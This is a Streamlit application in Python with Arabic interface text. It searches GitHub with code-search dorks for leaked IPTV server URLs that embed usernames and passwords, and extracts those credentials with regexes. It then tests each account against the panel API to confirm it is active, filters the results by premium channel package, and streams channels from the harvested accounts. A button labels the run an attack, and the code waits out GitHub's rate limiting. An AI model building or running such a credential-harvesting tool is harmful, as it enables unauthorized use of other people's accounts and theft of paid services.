import streamlit as st
import requests
import re
import time
import threading
from datetime import datetime

# --- إعدادات الواجهة ---
st.set_page_config(page_title="BEAST V28 VIP - PACKAGE HUNTER", layout="wide")

# --- إدارة الحالة (Global State للثريد) ---
# نستخدم كائن جلوبال لتجنب أخطاء الثريد مع Streamlit
@st.cache_resource
def get_shared_state():
    return {"hits": [], "is_scanning": False}

shared_state = get_shared_state()

if "auth" not in st.session_state: st.session_state.auth = False
if "page" not in st.session_state: st.session_state.page = "search"
if "selected_srv" not in st.session_state: st.session_state.selected_srv = None

# --- نظام الدخول ---
if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V28 VIP - LOGIN</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول النظام"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# --- التنسيق الجمالي ---
st.markdown("""
<style>
    .stApp { background-color: #050505; color: white; }
    .server-card { 
        background: #0d1117; border: 1px solid #30363d; 
        padding: 15px; border-radius: 8px; margin-bottom: 12px;
        border-left: 5px solid #00ff41;
    }
    .categories-preview {
        color: #8b949e; font-size: 13px; margin-top: 8px;
        padding: 8px; background: #010409; border-radius: 4px; border: 1px solid #21262d;
    }
    .target-badge { background: #ff0000; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; font-size: 11px; }
</style>
""", unsafe_allow_html=True)

# --- المحرك الخلفي (الخيط الموازي) ---
def scanner_engine(token, pages, target_pkg):
    shared_state["is_scanning"] = True
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    
    # دروكات مطورة للوصول لملفات أكثر
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:json "server_url" "username"',
        'extension:php "panel_api.php" "password"',
        '"http://" "username=" "password=" "port" extension:txt'
    ]
    
    unique_hosts = set([h['host'] for h in shared_state["hits"]])
    target_lower = target_pkg.lower().strip() if target_pkg else ""

    for dork in dorks:
        for p in range(1, pages + 1):
            if not shared_state["is_scanning"]: break
            try:
                # استخدام sort=indexed لجلب الملفات الحديثة فقط لضمان عمل السيرفرات
                url = f"https://api.github.com/search/code?q={dork}&sort=indexed&order=desc&page={p}&per_page=50"
                res = requests.get(url, headers=headers).json()
                
                if "items" not in res:
                    time.sleep(10) # تجاوز حظر جيت هاب المؤقت
                    continue
                
                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=3).text
                        # Regex شامل لكل أشكال الروابط
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            if host in unique_hosts: continue
                            
                            # 1. فحص هل السيرفر يعمل؟
                            api_url = f"{host}/player_api.php?username={user}&password={pw}"
                            check = requests.get(api_url, timeout=3).json()
                            
                            if check.get("user_info", {}).get("status") == "Active":
                                # 2. جلب القوائم (Categories)
                                cat_req = requests.get(f"{api_url}&action=get_live_categories", timeout=3).json()
                                
                                has_target = False
                                cat_names = []
                                
                                if isinstance(cat_req, list):
                                    for c in cat_req:
                                        c_name = str(c.get('category_name', ''))
                                        cat_names.append(c_name)
                                        if target_lower and target_lower in c_name.lower():
                                            has_target = True
                                            
                                # 3. فلترة النتائج حسب الباقة المطلوبة
                                if not target_lower or has_target:
                                    unique_hosts.add(host)
                                    hit_data = {
                                        "host": host, "user": user, "pw": pw, 
                                        "info": check["user_info"],
                                        "categories": cat_names[:15], # حفظ أول 15 قائمة كعينة
                                        "has_target": has_target
                                    }
                                    shared_state["hits"].insert(0, hit_data) # إضافة في أعلى القائمة
                    except: continue
            except: continue
    shared_state["is_scanning"] = False

# --- الواجهة الرئيسية ---

# القائمة العلوية
st.markdown("### ⚡ BEAST V28 VIP - CONTROL PANEL")
c1, c2 = st.columns(2)
with c1:
    if st.button("📡 صفحة البحث (Scanner)", use_container_width=True): st.session_state.page = "search"
with c2:
    if st.button("📺 صفحة المشغل (Player)", use_container_width=True): st.session_state.page = "player"
st.divider()

# --- صفحة البحث ---
if st.session_state.page == "search":
    col_set, col_res = st.columns([1, 2.5])
    
    with col_set:
        st.subheader("⚙️ إعدادات الفحص")
        token = st.text_input("GitHub Token:", type="password")
        target_pkg = st.text_input("🎯 باقة محددة (اختياري):", placeholder="مثال: bein, ssc, osn...")
        pages = st.number_input("عمق البحث (صفحات)", 10, 100, 30)
        
        if st.button("🚀 بدء الهجوم الذكي"):
            if not token: st.error("التوكن مطلوب!")
            elif not shared_state["is_scanning"]:
                shared_state["hits"] = [] # تفريغ النتائج القديمة
                threading.Thread(target=scanner_engine, args=(token, pages, target_pkg), daemon=True).start()
                st.success("تم تشغيل المحرك! يتم الآن الفلترة...")
        
        if st.button("🛑 إيقاف / تحديث النتائج"):
            shared_state["is_scanning"] = False
            st.rerun()
            
        if shared_state["is_scanning"]:
            st.warning("⏳ البحث يعمل في الخلفية... النتائج تظهر هنا تلقائياً.")

    with col_res:
        st.subheader(f"🏆 السيرفرات المكتشفة ({len(shared_state['hits'])})")
        # عرض النتائج
        for idx, srv in enumerate(shared_state["hits"]):
            with st.container():
                target_badge = f"<span class='target-badge'>🎯 متوفر: {target_pkg.upper()}</span>" if srv['has_target'] and target_pkg else ""
                cats_str = " | ".join(srv['categories']) if srv['categories'] else "لا توجد تصنيفات واضحة"
                
                st.markdown(f"""
                <div class="server-card">
                    <div style="display:flex; justify-content:space-between;">
                        <b><span style="color:#00ff41;">● ACTIVE</span> | {srv['host']}</b>
                        {target_badge}
                    </div>
                    <small style="color:#aaa;">User: {srv['user']} | Exp: {datetime.fromtimestamp(int(srv['info'].get('exp_date', 0))).strftime('%Y-%m-%d') if srv['info'].get('exp_date') else 'N/A'} | Max Conn: {srv['info'].get('max_connections', '1')}</small>
                    <div class="categories-preview">
                        <b>📁 قوائم السيرفر:</b> {cats_str} ...
                    </div>
                </div>
                """, unsafe_allow_html=True)
                
                if st.button(f"📺 تشغيل السيرفر", key=f"play_{idx}"):
                    st.session_state.selected_srv = srv
                    st.session_state.page = "player"
                    st.rerun()

# --- صفحة المشغل ---
elif st.session_state.page == "player":
    if not st.session_state.selected_srv:
        st.info("⚠️ اختر سيرفر من صفحة البحث أولاً.")
    else:
        srv = st.session_state.selected_srv
        st.markdown(f"### 🎬 BEAST PLAYER | المتصل: `{srv['host']}`")
        
        # دوال جلب البيانات
        @st.cache_data(ttl=300)
        def get_cats(): return requests.get(f"{srv['host']}/player_api.php?username={srv['user']}&password={srv['pw']}&action=get_live_categories", timeout=5).json()
        @st.cache_data(ttl=300)
        def get_streams(): return requests.get(f"{srv['host']}/player_api.php?username={srv['user']}&password={srv['pw']}&action=get_live_streams", timeout=5).json()

        try:
            cats = get_cats()
            streams = get_streams()
            
            c1, c2, c3 = st.columns([1, 1.5, 2.5])
            
            with c1:
                st.subheader("📁 الباقات")
                if isinstance(cats, list):
                    cat_dict = {c['category_id']: c['category_name'] for c in cats}
                    selected_cat = st.selectbox("اختر الباقة", options=list(cat_dict.keys()), format_func=lambda x: cat_dict[x])
                else: st.error("فشل جلب الباقات.")
            
            with c2:
                st.subheader("📺 القنوات")
                if isinstance(streams, list):
                    filtered = [s for s in streams if str(s.get('category_id')) == str(selected_cat)]
                    search_ch = st.text_input("🔍 بحث عن قناة..")
                    
                    st.markdown("<div style='height:400px; overflow-y:auto; background:#111; padding:10px; border-radius:5px;'>", unsafe_allow_html=True)
                    for ch in filtered:
                        if search_ch.lower() in ch.get('name', '').lower():
                            if st.button(f"▶ {ch.get('name')}", key=f"ch_{ch.get('stream_id')}", use_container_width=True):
                                st.session_state.stream_url = f"{srv['host']}/live/{srv['user']}/{srv['pw']}/{ch['stream_id']}.m3u8"
                    st.markdown("</div>", unsafe_allow_html=True)

            with c3:
                st.subheader("🖥️ الشاشة")
                if "stream_url" in st.session_state:
                    st.components.v1.html(f"""
                        <link href="https://vjs.zencdn.net/7.20.3/video-js.css" rel="stylesheet" />
                        <video id="vid1" class="video-js vjs-fluid vjs-default-skin vjs-big-play-centered" controls autoplay preload="auto">
                            <source src="{st.session_state.stream_url}" type="application/x-mpegURL">
                        </video>
                        <script src="https://vjs.zencdn.net/7.20.3/video.min.js"></script>
                        <script>videojs('vid1').play();</script>
                    """, height=450)
                else:
                    st.info("اختر قناة من القائمة لبدء المشاهدة.")
        except Exception as e:
            st.error("❌ السيرفر لا يستجيب حالياً، قد يكون محظوراً أو يرفض الاتصال الخارجي.")
